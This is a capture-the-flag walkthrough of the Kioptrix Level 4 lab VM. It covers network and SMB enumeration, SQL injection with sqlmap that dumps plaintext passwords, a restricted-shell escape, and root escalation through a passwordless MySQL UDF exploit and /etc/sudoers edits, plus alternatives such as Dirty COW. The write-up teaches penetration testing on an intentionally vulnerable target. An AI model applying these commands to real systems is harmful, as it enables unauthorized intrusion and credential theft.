# Kioptrix Level 4

### Contents
<!-- TOC -->
- [Footprinting](#footprinting)
- [Reconnaisance](#reconnaisance)
  - [SMB Enumeration](#smb-enumeration)
- [HTTP](#http)
  - [Dirbuster Results](#dirbuster-results)
  - [SQL injection](#sql-injection)
- [Initial Shell](#initial-shell)
- [Privilege Escalation](#privilege-escalation)
  - [Alternative Routes](#alternative-routes)

<!-- /TOC -->

Our target network is `10.0.2.0/24`.

# Footprinting
Find the IP address of the target host via:

```bash
netdiscover -r 10.0.2.0/24
```

For the purpose of this guide we will assume our target is at IP address **10.0.2.15**.

# Reconnaisance

We perform an initial scan as follows:

```bash
nmap 10.0.2.15
```

```
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
MAC Address: 08:00:27:51:AE:1B (Oracle VirtualBox virtual NIC)
```

Let's check for UDP ports:

```bash
nmap -sU 10.0.2.15
```

Let's do version detection and run scripts:

```bash
nmap -A 10.0.2.15
```

```
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
| ssh-hostkey:
|   1024 9b:ad:4f:f2:1e:c5:f2:39:14:b9:d3:a0:0b:e8:41:71 (DSA)
|_  2048 85:40:c6:d5:41:26:05:34:ad:f8:6e:f2:a7:6b:4f:0e (RSA)
80/tcp  open  http        Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
|_http-server-header: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch
|_http-title: Site doesn't have a title (text/html).
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.28a (workgroup: WORKGROUP)
MAC Address: 08:00:27:51:AE:1B (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 - 2.6.33
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h59m57s, deviation: 2h49m42s, median: -2s
|_nbstat: NetBIOS name: KIOPTRIX4, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery:
|   OS: Unix (Samba 3.0.28a)
|   Computer name: Kioptrix4
|   NetBIOS computer name:
|   Domain name: localdomain
|   FQDN: Kioptrix4.localdomain
|_  System time: 2019-03-11T16:20:31-04:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)
```
Now we proceed by examining each of the services on the machine.

## SMB Enumeration

```bash
enum4linux -a 10.0.2.15
```

```
 ==========================
|    Target Information    |
 ==========================
Target ........... 10.0.2.15
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 =================================================
|    Enumerating Workgroup/Domain on 10.0.2.15    |
 =================================================
[+] Got domain/workgroup name: WORKGROUP

 =========================================
|    Nbtstat Information for 10.0.2.15    |
 =========================================
Looking up status of 10.0.2.15
	KIOPTRIX4       <00> -         B <ACTIVE>  Workstation Service
	KIOPTRIX4       <03> -         B <ACTIVE>  Messenger Service
	KIOPTRIX4       <20> -         B <ACTIVE>  File Server Service
	..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
	WORKGROUP       <1d> -         B <ACTIVE>  Master Browser
	WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections
	WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name

	MAC Address = 00-00-00-00-00-00

 ==================================
|    Session Check on 10.0.2.15    |
 ==================================
[+] Server 10.0.2.15 allows sessions using username '', password ''

 ===================================
|    OS information on 10.0.2.15    |
 ===================================
	KIOPTRIX4      Wk Sv PrQ Unx NT SNT Kioptrix4 server (Samba, Ubuntu)
	platform_id     :	500
	os version      :	4.9
	server type     :	0x809a03

 ==========================
|    Users on 10.0.2.15    |
 ==========================
index: 0x1 RID: 0x1f5 acb: 0x00000010 Account: nobody	Name: nobodyDesc: (null)
index: 0x2 RID: 0xbbc acb: 0x00000010 Account: robert	Name: ,,,	Desc: (null)
index: 0x3 RID: 0x3e8 acb: 0x00000010 Account: root	Name: root	Desc: (null)
index: 0x4 RID: 0xbba acb: 0x00000010 Account: john	Name: ,,,	Desc: (null)
index: 0x5 RID: 0xbb8 acb: 0x00000010 Account: loneferret	Name: loneferret,,,	Desc: (null)

user:[nobody] rid:[0x1f5]
user:[robert] rid:[0xbbc]
user:[root] rid:[0x3e8]
user:[john] rid:[0xbba]
user:[loneferret] rid:[0xbb8]

 ======================================
|    Share Enumeration on 10.0.2.15    |
 ======================================

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	IPC$            IPC       IPC Service (Kioptrix4 server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

 =================================================
|    Password Policy Information for 10.0.2.15    |
 =================================================


[+] Attaching to 10.0.2.15 using a NULL share

[+] Trying protocol 445/SMB...

[+] Found domain(s):

	[+] KIOPTRIX4
	[+] Builtin

[+] Password Info for Domain: KIOPTRIX4

	[+] Minimum password length: 5
	[+] Password history length: None
	[+] Maximum password age: Not Set
	[+] Password Complexity Flags: 000000

		[+] Domain Refuse Password Change: 0
		[+] Domain Password Store Cleartext: 0
		[+] Domain Password Lockout Admins: 0
		[+] Domain Password No Clear Change: 0
		[+] Domain Password No Anon Change: 0
		[+] Domain Password Complex: 0

	[+] Minimum password age: None
	[+] Reset Account Lockout Counter: 30 minutes
	[+] Locked Account Duration: 30 minutes
	[+] Account Lockout Threshold: None
	[+] Forced Log off Time: Not Set


[+] Retieved partial password policy with rpcclient:

Password Complexity: Disabled
Minimum Password Length: 0

 ====================================================================
|    Users on 10.0.2.15 via RID cycling (RIDS: 500-550,1000-1050)    |
 ====================================================================
[I] Found new SID: S-1-5-21-2529228035-991147148-3991031631
[I] Found new SID: S-1-22-1
[I] Found new SID: S-1-5-32

[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1000 Unix User\loneferret (Local User)
S-1-22-1-1001 Unix User\john (Local User)
S-1-22-1-1002 Unix User\robert (Local User)

[+] Enumerating users using SID S-1-5-21-2529228035-991147148-3991031631 and logon username '', password ''
S-1-5-21-2529228035-991147148-3991031631-501 KIOPTRIX4\nobody (Local User)
S-1-5-21-2529228035-991147148-3991031631-513 KIOPTRIX4\None (Domain Group)
S-1-5-21-2529228035-991147148-3991031631-1000 KIOPTRIX4\root (Local User)

[+] Enumerating users using SID S-1-5-32 and logon username '', password ''
S-1-5-32-544 BUILTIN\Administrators (Local Group)
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)
```

**Identified Users**
```
loneferret
john
robert
nobody
root
```

# HTTP

Let's run `nikto` on the web server:

```bash
nikto -host 10.0.2.15
```

```
Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.0.2.15
+ Target Hostname:    10.0.2.15
+ Target Port:        80
+ Start Time:         2019-03-11 16:21:56 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch
+ Retrieved x-powered-by header: PHP/5.2.4-2ubuntu5.6
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ PHP/5.2.4-2ubuntu5.6 appears to be outdated (current is at least 5.6.9). PHP 5.5.25 and 5.4.41 are also current.
+ Apache/2.2.8 appears to be outdated (current is at least Apache/2.4.12). Apache 2.0.65 (final release) and 2.2.29 are also current.
+ Uncommon header 'tcn' found, with contents: list
+ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for 'index' were found: index.php
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ OSVDB-12184: /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-12184: /?=PHPE9568F36-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-12184: /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-12184: /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-3268: /icons/: Directory indexing found.
+ OSVDB-3268: /images/: Directory indexing found.
+ OSVDB-3268: /images/?pattern=/etc/*&sort=name: Directory indexing found.
+ Server leaks inodes via ETags, header found with file /icons/README, inode: 98933, size: 5108, mtime: Tue Aug 28 06:48:10 2007
+ OSVDB-3233: /icons/README: Apache default file found.
+ Cookie PHPSESSID created without the httponly flag
+ 8346 requests: 0 error(s) and 20 item(s) reported on remote host
+ End Time:           2019-03-11 16:23:39 (GMT-4) (103 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

## Dirbuster Results

```
/cgi-bin/
/
/images/
/icons/
/index/
/cgi-bin//
/images//
/icons//
//
//cgi-bin/
//images/
//index/
/checklogin.php
/index.php
/.html
/cgi-bin/.html
/icons/.html
/images/.html
//index.php
```

LFI was also tested but not identified.

## SQL injection

Entering `user:'` on the password page led to the following output:

```
Warning: mysql_num_rows(): supplied argument is not a valid MySQL result resource in /var/www/checklogin.php on line 28
Wrong Username or Password
```

This indicates that **password** may be vulnerable to injection.

Examining the `POST` reponse the following form was found:

```
mypassword:passwordA
myusername:userA
Submit:Login
```

Using `sqlmap` we can translate this:

```bash
sqlmap --url "10.0.2.15" --forms
```

```
[14:31:21] [INFO] fetching number of databases
[14:31:21] [INFO] retrieved: 3
[14:31:21] [INFO] retrieved: information_schema
[14:31:22] [INFO] retrieved: members

[14:31:23] [INFO] fetching number of tables for database 'members'
[14:31:23] [INFO] retrieved: 1
[14:31:23] [INFO] retrieved: members

Database: members
Table: members
[2 entries]
+----+----------+-----------------------+
| id | username | password              |
+----+----------+-----------------------+
| 1  | john     | MyNameIsJohn          |
| 2  | robert   | ADGAdsafdfwt4gadfga== |
+----+----------+-----------------------+
```
**We now have some credentials:**

id  | username  |  password
--|---|--
1  | john  | MyNameIsJohn
2  |  robert | ADGAdsafdfwt4gadfga

We can login to the website using these credentials, but are not given any further functions.

# Initial Shell

But, using `ssh` with either we get our first low privilege shell:

```
Welcome to LigGoat Security Systems - We are Watching
== Welcome LigGoat Employee ==
LigGoat Shell is in place so you  don't screw up
Type '?' or 'help' to get the list of allowed commands
john:~$ ?
cd  clear  echo  exit  help  ll  lpath  ls
```

Using this guide [this guide][464d8d1a] we try to escape the shell.

However, we are unable to do any of the following:
* Run binaries other than the commands defined
* Explore directories other than those
* Use redirection or pipes
* Use other languages

Based upon the output however, it appears that this shell is based from lshell.

[This exploit](https://www.exploit-db.com/exploits/39632) is available to use and works successfully. However, a simpler way to gain a full shell was:

```bash
echo os.system('/bin/bash')
```

# Privilege Escalation

No simple way could be found the elevate `john` or `robert`.

Analysis of `/var/www` files found that `mysql` could be accessed as `root` without a password.

`mysq -u root -p` gives access.

[This MYSQL UDF Exploit](https://www.exploit-db.com/exploits/1518) allows for execution of commands as root.

There are a range of ways to gain root at this point, but what we did was:

1. `chmod 777 /etc/sudoers`
2. Add `john` with full privileges
3. `chmod 4400 /etc/sudoers`

`sudo su -` as `john` gives **root**.

##  Alternative Routes

* `usermod -a -G admin john`
* Dirty COW
* Add an SSH key as root to `/root/.ssh/authorized_keys`



  [464d8d1a]: https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/ "Linux Shell Escapes"
